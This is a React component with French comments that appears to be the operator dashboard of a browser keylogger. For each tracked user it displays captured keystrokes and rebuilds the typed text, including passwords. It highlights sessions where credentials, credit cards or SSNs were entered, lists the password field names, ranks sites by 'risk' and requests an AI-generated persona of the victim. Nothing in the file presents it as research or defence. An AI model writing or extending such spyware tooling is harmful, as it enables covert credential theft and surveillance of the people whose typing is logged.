import { useEffect, useState } from 'react'
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card'
import { Badge } from '@/components/ui/badge'
import { Button } from '@/components/ui/button'
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs'
import { motion } from 'framer-motion'
import {
  ArrowLeft,
  Brain,
  Activity,
  Globe,
  Clock,
  TrendingUp,
  AlertTriangle,
  Target,
  Sparkles,
  Calendar,
  Eye,
  KeyRound,
  Mail,
  CreditCard,
  ShieldAlert,
  FileText,
  ChevronDown,
  ChevronUp
} from 'lucide-react'
import { formatNumber } from '@/lib/utils'
import { BarChart, Bar, PieChart, Pie, Cell, ResponsiveContainer, XAxis, YAxis, Tooltip } from 'recharts'
import type { UserPersona } from '@/types'
import { KeylogsViewer } from './KeylogsViewer'

interface UserProfileProps {
  userId: string
  onBack: () => void
}

interface UserData {
  userId: string
  firstSeen: string
  lastSeen: string
  totalSessions: number
  totalKeystrokes: number
  sessions: Array<{
    url: string
    title: string
    startTime: string
    endTime: string
    keystrokes: any[]
    sensitivityScore?: number
    sensitivityLevel?: 'low' | 'medium' | 'high' | 'critical'
    sensitiveData?: {
      hasPassword: boolean
      hasEmail: boolean
      hasCreditCard: boolean
      hasSSN: boolean
      hasPhoneNumber: boolean
      passwordInputs: string[]
      emailInputs: string[]
      sensitiveInputs: string[]
    }
  }>
  stats?: {
    criticalSessions: number
    highSessions: number
    mediumSessions: number
    lowSessions: number
    passwordInputsDetected: number
    emailInputsDetected: number
    creditCardDetected: number
  }
}

export function UserProfile({ userId, onBack }: UserProfileProps) {
  const [userData, setUserData] = useState<UserData | null>(null)
  const [persona, setPersona] = useState<UserPersona | null>(null)
  const [loading, setLoading] = useState(true)
  const [analyzing, setAnalyzing] = useState(false)
  const [expandedSessions, setExpandedSessions] = useState<Set<string>>(new Set())

  useEffect(() => {
    fetchUserData()
  }, [userId])

  const fetchUserData = async () => {
    try {
      setLoading(true)
      const response = await fetch(`/api/users/${userId}`)
      const data = await response.json()
      setUserData(data)
      
      // Analyser avec l'IA
      analyzeUser(data)
    } catch (error) {
      console.error('Error fetching user data:', error)
    } finally {
      setLoading(false)
    }
  }

  const analyzeUser = async (_data: UserData) => {
    try {
      setAnalyzing(true)
      const response = await fetch(`/api/ai/analyze-user/${userId}`)
      const result = await response.json()
      setPersona(result.analysis)
    } catch (error) {
      console.error('Error analyzing user:', error)
    } finally {
      setAnalyzing(false)
    }
  }

  const toggleSession = (sessionKey: string) => {
    const newExpanded = new Set(expandedSessions)
    if (newExpanded.has(sessionKey)) {
      newExpanded.delete(sessionKey)
    } else {
      newExpanded.add(sessionKey)
    }
    setExpandedSessions(newExpanded)
  }

  const reconstructText = (keystrokes: any[]) => {
    let text = ''
    keystrokes.forEach(k => {
      if (k.key.length === 1 && !k.isSpecialKey) {
        text += k.key
      } else if (k.key === 'Backspace' && text.length > 0) {
        text = text.slice(0, -1)
      } else if (k.key === 'Enter') {
        text += '\n'
      } else if (k.key === ' ') {
        text += ' '
      }
    })
    return text
  }

  if (loading || !userData) {
    return (
      <div className="flex items-center justify-center p-12">
        <div className="text-center space-y-4">
          <Brain className="w-12 h-12 animate-pulse text-primary mx-auto" />
          <p className="text-muted-foreground">Loading user profile...</p>
        </div>
      </div>
    )
  }

  // Calculer les statistiques
  const sitesVisited = [...new Set(userData.sessions.map(s => {
    try {
      return new URL(s.url).hostname
    } catch {
      return s.url
    }
  }))]

  const topSites = userData.sessions.reduce((acc, session) => {
    const domain = sitesVisited.find(site => session.url.includes(site)) || 'Unknown'
    acc[domain] = (acc[domain] || 0) + 1
    return acc
  }, {} as Record<string, number>)

  const topSitesData = Object.entries(topSites)
    .sort((a, b) => b[1] - a[1])
    .slice(0, 5)
    .map(([name, value]) => ({ name, value }))

  // Activité par heure
  const activityByHour = userData.sessions.reduce((acc, session) => {
    const hour = new Date(session.startTime).getHours()
    acc[hour] = (acc[hour] || 0) + 1
    return acc
  }, {} as Record<number, number>)

  const hourlyData = Array.from({ length: 24 }, (_, i) => ({
    hour: i,
    sessions: activityByHour[i] || 0
  }))

  // Timeline des dernières sessions
  const recentSessions = userData.sessions.slice(0, 15) // Déjà triées par pertinence côté serveur

  const COLORS = ['#4fd1c5', '#9f7aea', '#f56565', '#48bb78', '#ed8936']

  const getSensitivityColor = (level?: string) => {
    switch (level) {
      case 'critical': 
        return { 
          bg: 'bg-red-500/20', 
          text: 'text-red-400', 
          border: 'border-red-500/50' 
        }
      case 'high': 
        return { 
          bg: 'bg-orange-500/20', 
          text: 'text-orange-400', 
          border: 'border-orange-500/50' 
        }
      case 'medium': 
        return { 
          bg: 'bg-yellow-500/20', 
          text: 'text-yellow-400', 
          border: 'border-yellow-500/50' 
        }
      case 'low': 
        return { 
          bg: 'bg-green-500/20', 
          text: 'text-green-400', 
          border: 'border-green-500/50' 
        }
      default: 
        return { 
          bg: 'bg-gray-500/20', 
          text: 'text-gray-400', 
          border: 'border-gray-500/50' 
        }
    }
  }

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex items-center gap-4">
        <Button variant="ghost" size="icon" onClick={onBack}>
          <ArrowLeft className="w-4 h-4" />
        </Button>
        <div className="flex-1">
          <h1 className="text-3xl font-bold text-gradient">User Profile</h1>
          <p className="text-muted-foreground">Deep analysis and behavioral insights</p>
        </div>
        {analyzing && (
          <Badge variant="outline" className="gap-2">
            <Brain className="w-3 h-3 animate-pulse" />
            AI Analyzing...
          </Badge>
        )}
      </div>

      {/* User Card */}
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
      >
        <Card className="glass-card border-border/50">
          <CardContent className="p-6">
            <div className="flex items-start gap-6">
              <div className="w-20 h-20 rounded-2xl bg-gradient-to-br from-primary to-secondary flex items-center justify-center text-3xl font-bold text-white shadow-xl">
                {userId.substring(0, 2).toUpperCase()}
              </div>
              
              <div className="flex-1 space-y-4">
                <div>
                  <h2 className="text-2xl font-bold">{userId}</h2>
                  <p className="text-sm text-muted-foreground">User ID</p>
                </div>

                <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                  <div>
                    <div className="flex items-center gap-2 text-muted-foreground text-sm mb-1">
                      <Activity className="w-4 h-4" />
                      <span>Sessions</span>
                    </div>
                    <p className="text-2xl font-bold">{userData.totalSessions}</p>
                  </div>
                  
                  <div>
                    <div className="flex items-center gap-2 text-muted-foreground text-sm mb-1">
                      <TrendingUp className="w-4 h-4" />
                      <span>Keystrokes</span>
                    </div>
                    <p className="text-2xl font-bold">{formatNumber(userData.totalKeystrokes)}</p>
                  </div>
                  
                  <div>
                    <div className="flex items-center gap-2 text-muted-foreground text-sm mb-1">
                      <Globe className="w-4 h-4" />
                      <span>Sites</span>
                    </div>
                    <p className="text-2xl font-bold">{sitesVisited.length}</p>
                  </div>
                  
                  <div>
                    <div className="flex items-center gap-2 text-muted-foreground text-sm mb-1">
                      <Calendar className="w-4 h-4" />
                      <span>Active Since</span>
                    </div>
                    <p className="text-sm font-semibold">
                      {new Date(userData.firstSeen).toLocaleDateString()}
                    </p>
                  </div>
                </div>
              </div>
            </div>
          </CardContent>
        </Card>
      </motion.div>

      {/* Tabs for different views */}
      <Tabs defaultValue="overview" className="space-y-6">
        <TabsList className="glass-card">
          <TabsTrigger value="overview" className="flex items-center gap-2">
            <Eye className="w-4 h-4" />
            Overview
          </TabsTrigger>
          <TabsTrigger value="by-site" className="flex items-center gap-2">
            <Globe className="w-4 h-4" />
            By Website
          </TabsTrigger>
          <TabsTrigger value="keylogs" className="flex items-center gap-2">
            <FileText className="w-4 h-4" />
            All Keylogs
          </TabsTrigger>
        </TabsList>

        <TabsContent value="overview" className="space-y-6">
          {/* AI Persona */}
          {analyzing && !persona && (
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: 0.1 }}
            >
              <Card className="glass-card border-primary/50">
                <CardContent className="flex flex-col items-center justify-center p-12 space-y-4">
                  <div className="relative">
                    <Brain className="w-16 h-16 text-primary animate-pulse" />
                    <div className="absolute inset-0 animate-ping">
                      <Brain className="w-16 h-16 text-primary opacity-20" />
                    </div>
                  </div>
                  <div className="text-center space-y-2">
                    <h3 className="text-xl font-bold text-gradient">AI Analysis in Progress</h3>
                    <p className="text-muted-foreground">
                      Analyzing user behavior and generating persona...
                    </p>
                    <div className="flex items-center justify-center gap-1 mt-4">
                      <div className="w-2 h-2 bg-primary rounded-full animate-bounce" style={{ animationDelay: '0ms' }}></div>
                      <div className="w-2 h-2 bg-primary rounded-full animate-bounce" style={{ animationDelay: '150ms' }}></div>
                      <div className="w-2 h-2 bg-primary rounded-full animate-bounce" style={{ animationDelay: '300ms' }}></div>
                    </div>
                  </div>
                </CardContent>
              </Card>
            </motion.div>
          )}

          {persona && (
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: 0.1 }}
            >
              <Card className="glass-card border-primary/50 glow-primary">
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <Sparkles className="w-5 h-5 text-primary" />
                    AI-Generated Persona
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-6">
                  <div>
                    <h3 className="text-xl font-bold mb-2">{persona.persona.nom}</h3>
                    <p className="text-muted-foreground">{persona.persona.description}</p>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <h4 className="font-semibold mb-3 flex items-center gap-2">
                    <Target className="w-4 h-4" />
                    Key Traits
                  </h4>
                  <div className="flex flex-wrap gap-2">
                    {persona.persona.traits.map((trait, i) => (
                      <Badge key={i} variant="secondary">
                        {trait}
                      </Badge>
                    ))}
                  </div>
                </div>

                <div>
                  <h4 className="font-semibold mb-3 flex items-center gap-2">
                    <Eye className="w-4 h-4" />
                    Interests
                  </h4>
                  <div className="flex flex-wrap gap-2">
                    {persona.intérêts.map((interest, i) => (
                      <Badge key={i} variant="outline">
                        {interest}
                      </Badge>
                    ))}
                  </div>
                </div>
              </div>

              <div className="bg-muted/30 rounded-lg p-4">
                <h4 className="font-semibold mb-2">Behavioral Summary</h4>
                <p className="text-sm text-muted-foreground">{persona.résumé}</p>
              </div>

              <div>
                <h4 className="font-semibold mb-3">AI Insights</h4>
                <ul className="space-y-2">
                  {persona.insights.map((insight, i) => (
                    <li key={i} className="flex items-start gap-2 text-sm">
                      <Brain className="w-4 h-4 text-primary mt-0.5 flex-shrink-0" />
                      <span>{insight}</span>
                    </li>
                  ))}
                </ul>
              </div>
            </CardContent>
          </Card>
        </motion.div>
      )}

      {/* Charts Grid */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        {/* Sensitive Data Detection */}
        {userData.stats && (userData.stats.passwordInputsDetected > 0 || userData.stats.creditCardDetected > 0) && (
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.2 }}
            className="lg:col-span-2"
          >
            <Card className="glass-card border-red-500/50">
              <CardHeader>
                <CardTitle className="flex items-center gap-2 text-red-400">
                  <AlertTriangle className="w-5 h-5" />
                  Sensitive Data Detected
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                  {userData.stats.passwordInputsDetected > 0 && (
                    <div className="bg-red-500/10 rounded-lg p-4 border border-red-500/30">
                      <div className="text-3xl font-bold text-red-400">{userData.stats.passwordInputsDetected}</div>
                      <div className="text-sm text-muted-foreground mt-1">Password Inputs</div>
                    </div>
                  )}
                  
                  {userData.stats.emailInputsDetected > 0 && (
                    <div className="bg-yellow-500/10 rounded-lg p-4 border border-yellow-500/30">
                      <div className="text-3xl font-bold text-yellow-400">{userData.stats.emailInputsDetected}</div>
                      <div className="text-sm text-muted-foreground mt-1">Email Inputs</div>
                    </div>
                  )}
                  
                  {userData.stats.creditCardDetected > 0 && (
                    <div className="bg-red-500/10 rounded-lg p-4 border border-red-500/30">
                      <div className="text-3xl font-bold text-red-400">{userData.stats.creditCardDetected}</div>
                      <div className="text-sm text-muted-foreground mt-1">Credit Cards</div>
                    </div>
                  )}

                  <div className="bg-orange-500/10 rounded-lg p-4 border border-orange-500/30">
                    <div className="text-3xl font-bold text-orange-400">{userData.stats.criticalSessions}</div>
                    <div className="text-sm text-muted-foreground mt-1">Critical Sessions</div>
                  </div>
                </div>
              </CardContent>
            </Card>
          </motion.div>
        )}

        {/* Activity Heatmap */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.3 }}
        >
          <Card className="glass-card">
            <CardHeader>
              <CardTitle>Activity Heatmap (24h)</CardTitle>
            </CardHeader>
            <CardContent>
              <ResponsiveContainer width="100%" height={200}>
                <BarChart data={hourlyData}>
                  <XAxis dataKey="hour" stroke="hsl(var(--muted-foreground))" fontSize={12} />
                  <YAxis stroke="hsl(var(--muted-foreground))" fontSize={12} />
                  <Tooltip 
                    contentStyle={{ 
                      backgroundColor: 'hsl(var(--card))', 
                      border: '1px solid hsl(var(--border))' 
                    }} 
                  />
                  <Bar dataKey="sessions" fill="url(#gradient)" radius={[8, 8, 0, 0]} />
                  <defs>
                    <linearGradient id="gradient" x1="0" y1="0" x2="0" y2="1">
                      <stop offset="0%" stopColor="hsl(var(--primary))" />
                      <stop offset="100%" stopColor="hsl(var(--secondary))" />
                    </linearGradient>
                  </defs>
                </BarChart>
              </ResponsiveContainer>
            </CardContent>
          </Card>
        </motion.div>

        {/* Top Sites */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.4 }}
        >
          <Card className="glass-card">
            <CardHeader>
              <CardTitle>Top 5 Visited Sites</CardTitle>
            </CardHeader>
            <CardContent>
              <ResponsiveContainer width="100%" height={200}>
                <PieChart>
                  <Pie
                    data={topSitesData}
                    cx="50%"
                    cy="50%"
                    outerRadius={80}
                    dataKey="value"
                    label={(entry) => entry.name?.replace('www.', '') || 'Unknown'}
                  >
                    {topSitesData.map((_entry, index) => (
                      <Cell key={`cell-${index}`} fill={COLORS[index % COLORS.length]} />
                    ))}
                  </Pie>
                  <Tooltip />
                </PieChart>
              </ResponsiveContainer>
            </CardContent>
          </Card>
        </motion.div>
      </div>

      {/* Recent Activity Timeline */}
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ delay: 0.5 }}
      >
        <Card className="glass-card">
          <CardHeader>
            <CardTitle>Recent Activity Timeline</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="space-y-4">
              {recentSessions.map((session, i) => {
                const sensitivityColor = getSensitivityColor(session.sensitivityLevel || 'low');
                
                return (
                  <motion.div 
                    key={i} 
                    initial={{ opacity: 0, x: -20 }}
                    animate={{ opacity: 1, x: 0 }}
                    transition={{ delay: 0.5 + i * 0.05 }}
                    className={`flex items-start gap-4 p-4 rounded-lg bg-muted/30 hover:bg-muted/50 transition-colors border ${sensitivityColor.border}`}
                  >
                    <div className={`w-10 h-10 rounded-lg ${sensitivityColor.bg} ${sensitivityColor.text} flex items-center justify-center font-bold text-sm flex-shrink-0 border border-current`}>
                      {i + 1}
                    </div>
                    
                    <div className="flex-1 min-w-0 space-y-2">
                      <div className="flex items-start justify-between gap-2">
                        <div className="flex-1 min-w-0">
                          <h4 className="font-semibold truncate flex items-center gap-2">
                            {session.title}
                            {/* Sensitivity Badge */}
                            {session.sensitivityLevel && session.sensitivityLevel !== 'low' && (
                              <Badge 
                                variant="outline" 
                                className={`${sensitivityColor.bg} ${sensitivityColor.text} border-current text-xs`}
                              >
                                {session.sensitivityLevel.toUpperCase()}
                              </Badge>
                            )}
                          </h4>
                          <p className="text-sm text-muted-foreground truncate">{session.url}</p>
                        </div>
                        
                        <div className="text-xs text-muted-foreground flex items-center gap-1 whitespace-nowrap">
                          <Clock className="w-3 h-3" />
                          {new Date(session.startTime).toLocaleString()}
                        </div>
                      </div>

                      {/* Sensitive Data Indicators */}
                      {session.sensitiveData && (session.sensitiveData.hasPassword || session.sensitiveData.hasEmail || session.sensitiveData.hasCreditCard || session.sensitiveData.hasSSN) && (
                        <div className="flex flex-wrap items-center gap-2">
                          {session.sensitiveData.hasPassword && (
                            <Badge variant="destructive" className="text-xs flex items-center gap-1">
                              <KeyRound className="w-3 h-3" />
                              Password
                              {session.sensitiveData.passwordInputs && session.sensitiveData.passwordInputs.length > 0 && (
                                <span className="ml-1 opacity-70">
                                  ({session.sensitiveData.passwordInputs.slice(0, 2).join(', ')})
                                </span>
                              )}
                            </Badge>
                          )}
                          
                          {session.sensitiveData.hasEmail && (
                            <Badge variant="outline" className="text-xs bg-yellow-500/10 text-yellow-400 border-yellow-500/30">
                              <Mail className="w-3 h-3 mr-1" />
                              Email
                            </Badge>
                          )}
                          
                          {session.sensitiveData.hasCreditCard && (
                            <Badge variant="destructive" className="text-xs flex items-center gap-1">
                              <CreditCard className="w-3 h-3" />
                              Credit Card
                            </Badge>
                          )}
                          
                          {session.sensitiveData.hasSSN && (
                            <Badge variant="destructive" className="text-xs">
                              <ShieldAlert className="w-3 h-3 mr-1" />
                              SSN
                            </Badge>
                          )}
                        </div>
                      )}
                      
                      <div className="flex items-center gap-4 text-xs text-muted-foreground">
                        <span className="flex items-center gap-1">
                          <Activity className="w-3 h-3" />
                          {session.keystrokes.length} keys
                        </span>
                        {session.sensitivityScore !== undefined && (
                          <span className={`flex items-center gap-1 font-medium ${sensitivityColor.text}`}>
                            <AlertTriangle className="w-3 h-3" />
                            Risk: {session.sensitivityScore}
                          </span>
                        )}
                      </div>
                    </div>
                  </motion.div>
                );
              })}
            </div>
          </CardContent>
        </Card>
      </motion.div>
        </TabsContent>

        <TabsContent value="by-site" className="space-y-6">
          {/* Group sessions by domain */}
          {(() => {
            // Group sessions by domain
            const sessionsByDomain = userData.sessions.reduce((acc, session) => {
              let domain = 'Unknown'
              try {
                const url = new URL(session.url)
                domain = url.hostname.replace('www.', '')
              } catch (e) {
                domain = session.url
              }
              
              if (!acc[domain]) {
                acc[domain] = []
              }
              acc[domain].push(session)
              return acc
            }, {} as Record<string, typeof userData.sessions>)

            // Sort domains by total sensitivity score and session count
            const sortedDomains = Object.entries(sessionsByDomain).sort((a, b) => {
              const aTotalScore = a[1].reduce((sum, s) => sum + (s.sensitivityScore || 0), 0)
              const bTotalScore = b[1].reduce((sum, s) => sum + (s.sensitivityScore || 0), 0)
              return bTotalScore - aTotalScore
            })

            return (
              <div className="space-y-4">
                {sortedDomains.map(([domain, sessions], domainIndex) => {
                  const totalScore = sessions.reduce((sum, s) => sum + (s.sensitivityScore || 0), 0)
                  const avgScore = totalScore / sessions.length
                  const hasPassword = sessions.some(s => s.sensitiveData?.hasPassword)
                  const hasCreditCard = sessions.some(s => s.sensitiveData?.hasCreditCard)
                  const hasEmail = sessions.some(s => s.sensitiveData?.hasEmail)
                  const hasSSN = sessions.some(s => s.sensitiveData?.hasSSN)
                  
                  const maxLevel = sessions.reduce((max, s) => {
                    const levels = ['low', 'medium', 'high', 'critical']
                    const currentLevel = levels.indexOf(s.sensitivityLevel || 'low')
                    const maxLevel = levels.indexOf(max)
                    return currentLevel > maxLevel ? s.sensitivityLevel || 'low' : max
                  }, 'low' as 'low' | 'medium' | 'high' | 'critical')

                  const domainColor = getSensitivityColor(maxLevel)

                  return (
                    <motion.div
                      key={domain}
                      initial={{ opacity: 0, y: 20 }}
                      animate={{ opacity: 1, y: 0 }}
                      transition={{ delay: domainIndex * 0.05 }}
                    >
                      <Card className={`glass-card border-2 ${domainColor.border} ${avgScore > 50 ? 'ring-2 ring-red-500 ring-offset-2 ring-offset-background' : ''}`}>
                        <CardHeader>
                          <div className="flex items-start justify-between gap-4">
                            <div className="flex-1 min-w-0">
                              <CardTitle className="flex items-center gap-3 text-xl">
                                <Globe className="w-5 h-5" />
                                <span className="truncate">{domain}</span>
                              </CardTitle>
                              <p className="text-sm text-muted-foreground mt-1">
                                {sessions.length} session{sessions.length > 1 ? 's' : ''} · Avg Risk: {avgScore.toFixed(0)}
                              </p>
                            </div>

                            <div className="flex flex-wrap gap-2 items-start">
                              <Badge variant="outline" className={`${domainColor.bg} ${domainColor.text} border-current`}>
                                {maxLevel.toUpperCase()}
                              </Badge>
                              {hasPassword && (
                                <Badge variant="destructive" className="text-xs">
                                  <KeyRound className="w-3 h-3 mr-1" />
                                  Password
                                </Badge>
                              )}
                              {hasCreditCard && (
                                <Badge variant="destructive" className="text-xs">
                                  <CreditCard className="w-3 h-3 mr-1" />
                                  Card
                                </Badge>
                              )}
                              {hasEmail && (
                                <Badge variant="outline" className="text-xs bg-yellow-500/10 text-yellow-400 border-yellow-500/30">
                                  <Mail className="w-3 h-3 mr-1" />
                                  Email
                                </Badge>
                              )}
                              {hasSSN && (
                                <Badge variant="destructive" className="text-xs">
                                  <ShieldAlert className="w-3 h-3 mr-1" />
                                  SSN
                                </Badge>
                              )}
                            </div>
                          </div>
                        </CardHeader>
                        <CardContent>
                          <div className="space-y-3">
                            {sessions.map((session, sessionIndex) => {
                              const sessionColor = getSensitivityColor(session.sensitivityLevel || 'low')
                              const sessionKey = `${domain}-${sessionIndex}`
                              const isExpanded = expandedSessions.has(sessionKey)
                              const reconstructedText = reconstructText(session.keystrokes)
                              
                              return (
                                <div
                                  key={sessionIndex}
                                  className={`rounded-lg ${sessionColor.bg} border ${sessionColor.border}`}
                                >
                                  <div 
                                    className="p-3 cursor-pointer hover:bg-muted/10 transition-colors"
                                    onClick={() => toggleSession(sessionKey)}
                                  >
                                    <div className="flex items-start justify-between gap-3">
                                      <div className="flex-1 min-w-0">
                                        <h4 className="font-medium text-sm truncate">{session.title}</h4>
                                        <div className="flex items-center gap-3 mt-1 text-xs text-muted-foreground">
                                          <span className="flex items-center gap-1">
                                            <Clock className="w-3 h-3" />
                                            {new Date(session.startTime).toLocaleString()}
                                          </span>
                                          <span className="flex items-center gap-1">
                                            <Activity className="w-3 h-3" />
                                            {session.keystrokes.length} keys
                                          </span>
                                          <span className={`flex items-center gap-1 font-medium ${sessionColor.text}`}>
                                            <AlertTriangle className="w-3 h-3" />
                                            {session.sensitivityScore || 0}
                                          </span>
                                        </div>
                                      </div>

                                      <div className="flex items-center gap-2">
                                        {/* Sensitive Data Badges */}
                                        {session.sensitiveData && (session.sensitiveData.hasPassword || session.sensitiveData.hasEmail || session.sensitiveData.hasCreditCard) && (
                                          <div className="flex flex-wrap gap-1">
                                            {session.sensitiveData.hasPassword && (
                                              <Badge variant="destructive" className="text-xs">
                                                <KeyRound className="w-3 h-3" />
                                              </Badge>
                                            )}
                                            {session.sensitiveData.hasEmail && (
                                              <Badge variant="outline" className="text-xs bg-yellow-500/10 text-yellow-400 border-yellow-500/30">
                                                <Mail className="w-3 h-3" />
                                              </Badge>
                                            )}
                                            {session.sensitiveData.hasCreditCard && (
                                              <Badge variant="destructive" className="text-xs">
                                                <CreditCard className="w-3 h-3" />
                                              </Badge>
                                            )}
                                          </div>
                                        )}
                                        
                                        <Button variant="ghost" size="sm">
                                          {isExpanded ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
                                        </Button>
                                      </div>
                                    </div>

                                    {/* Password Input Names */}
                                    {session.sensitiveData?.passwordInputs && session.sensitiveData.passwordInputs.length > 0 && (
                                      <div className="mt-2 text-xs">
                                        <span className="text-muted-foreground">Fields: </span>
                                        <span className="font-mono text-red-400">
                                          {session.sensitiveData.passwordInputs.slice(0, 3).join(', ')}
                                          {session.sensitiveData.passwordInputs.length > 3 && ` +${session.sensitiveData.passwordInputs.length - 3} more`}
                                        </span>
                                      </div>
                                    )}
                                  </div>

                                  {/* Expanded Content */}
                                  {isExpanded && (
                                    <motion.div
                                      initial={{ opacity: 0, height: 0 }}
                                      animate={{ opacity: 1, height: 'auto' }}
                                      exit={{ opacity: 0, height: 0 }}
                                      className="border-t border-current/20 p-4 space-y-3"
                                    >
                                      {/* URL */}
                                      <div>
                                        <div className="text-xs font-semibold text-muted-foreground mb-1">URL</div>
                                        <div className="text-sm font-mono break-all bg-muted/30 p-2 rounded">
                                          {session.url}
                                        </div>
                                      </div>

                                      {/* Captured Text */}
                                      <div>
                                        <div className="text-xs font-semibold text-muted-foreground mb-1 flex items-center gap-2">
                                          <span>Captured Text</span>
                                          <Badge variant="outline" className="text-xs">{session.keystrokes.length} keystrokes</Badge>
                                        </div>
                                        <div className="bg-muted/50 rounded-lg p-3 font-mono text-sm max-h-64 overflow-y-auto whitespace-pre-wrap break-words">
                                          {reconstructedText || '(No text captured)'}
                                        </div>
                                      </div>

                                      {/* Sensitive Inputs Details */}
                                      {session.sensitiveData && (session.sensitiveData.passwordInputs?.length > 0 || session.sensitiveData.emailInputs?.length > 0) && (
                                        <div>
                                          <div className="text-xs font-semibold text-muted-foreground mb-2">Sensitive Input Fields</div>
                                          <div className="space-y-2">
                                            {session.sensitiveData.passwordInputs && session.sensitiveData.passwordInputs.length > 0 && (
                                              <div className="bg-red-500/10 border border-red-500/30 rounded p-2">
                                                <div className="text-xs font-semibold text-red-400 mb-1">🔒 Password Fields</div>
                                                <div className="text-xs font-mono">
                                                  {session.sensitiveData.passwordInputs.join(', ')}
                                                </div>
                                              </div>
                                            )}
                                            {session.sensitiveData.emailInputs && session.sensitiveData.emailInputs.length > 0 && (
                                              <div className="bg-yellow-500/10 border border-yellow-500/30 rounded p-2">
                                                <div className="text-xs font-semibold text-yellow-400 mb-1">📧 Email Fields</div>
                                                <div className="text-xs font-mono">
                                                  {session.sensitiveData.emailInputs.join(', ')}
                                                </div>
                                              </div>
                                            )}
                                          </div>
                                        </div>
                                      )}
                                    </motion.div>
                                  )}
                                </div>
                              )
                            })}
                          </div>
                        </CardContent>
                      </Card>
                    </motion.div>
                  )
                })}
              </div>
            )
          })()}
        </TabsContent>

        <TabsContent value="keylogs">
          <KeylogsViewer sessions={userData.sessions} />
        </TabsContent>
      </Tabs>
    </div>
  )
}
